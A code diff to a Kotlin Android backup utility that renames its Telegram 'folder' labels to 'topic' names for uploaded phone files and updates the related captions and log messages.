@@ -495,12 +495,12 @@ object BackupUtils {
                     else -> "application/octet-stream"
                 }
                 
-                // Determinar la carpeta de destino
-                val telegramFolder = getTelegramFolder(archivo.absolutePath)
+                // Determinar el tema de destino
+                val telegramTopic = getTelegramTopicName(archivo.absolutePath)
                 
-                // Crear caption con información de la carpeta (tema)
+                // Crear caption con información del tema (para agrupación)
                 val caption = buildString {
-                    append("📁 <b>$telegramFolder</b>\n")
+                    append("📁 <b>$telegramTopic</b>\n")
                     append("📄 <b>Archivo:</b> ${archivo.name}\n")
                     append("💾 <b>Tamaño:</b> ${formatFileSize(archivo.length())}\n")
                     append("📅 <b>Fecha:</b> ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date(archivo.lastModified()))}\n")
@@ -569,7 +569,7 @@ object BackupUtils {
                     return msg
                 }
                 
-                Log.d(TAG, "Archivo enviado exitosamente: ${archivo.name}")
+                Log.d(TAG, "✅ Archivo enviado exitosamente: ${archivo.name} a tema $telegramTopic")
                 response.close()
                 return null // null = éxito
                 
@@ -701,21 +701,21 @@ object BackupUtils {
     }
 
     /**
-     * Obtiene la carpeta de destino en Telegram basada en la ruta del archivo
+     * Obtiene el nombre del tema de Telegram basado en la ruta del archivo
      */
-    private fun getTelegramFolder(filePath: String): String {
+    private fun getTelegramTopicName(filePath: String): String {
         return try {
             val normalizedPath = filePath.lowercase()
             when {
                 normalizedPath.contains("/dcim/") -> {
                     when {
-                        normalizedPath.contains("/camera/") -> "📸 DCIM/Camera"
-                        normalizedPath.contains("/screenshots/") -> "📸 DCIM/Screenshots"
-                        normalizedPath.contains("/whatsapp/") -> "📸 DCIM/WhatsApp"
-                        normalizedPath.contains("/telegram/") -> "📸 DCIM/Telegram"
-                        normalizedPath.contains("/instagram/") -> "📸 DCIM/Instagram"
-                        normalizedPath.contains("/downloads/") -> "📸 DCIM/Downloads"
-                        else -> "📸 DCIM/Other"
+                        normalizedPath.contains("/camera/") -> "📸 DCIM - Camera"
+                        normalizedPath.contains("/screenshots/") -> "📸 DCIM - Screenshots"
+                        normalizedPath.contains("/whatsapp/") -> "📸 DCIM - WhatsApp"
+                        normalizedPath.contains("/telegram/") -> "📸 DCIM - Telegram"
+                        normalizedPath.contains("/instagram/") -> "📸 DCIM - Instagram"
+                        normalizedPath.contains("/downloads/") -> "📸 DCIM - Downloads"
+                        else -> "📸 DCIM - Other"
                     }
                 }
                 normalizedPath.contains("/pictures/") -> "📸 Pictures"
@@ -732,7 +732,7 @@ object BackupUtils {
                 else -> "📁 Other"
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error determinando carpeta de Telegram: ${e.message}")
+            Log.e(TAG, "Error determinando tema de Telegram: ${e.message}")
             "📁 Other"
         }
     }
